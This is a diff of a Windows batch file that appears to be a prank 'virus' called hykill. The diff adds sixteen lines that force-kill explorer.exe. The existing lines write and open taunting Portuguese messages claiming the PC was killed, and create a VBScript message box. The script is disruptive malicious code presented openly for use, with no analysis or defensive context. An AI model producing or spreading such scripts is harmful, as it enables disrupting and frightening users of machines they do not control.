@@ -1,4 +1,20 @@
 @echo off
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
+taskkill -f /im explorer.exe
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
 echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
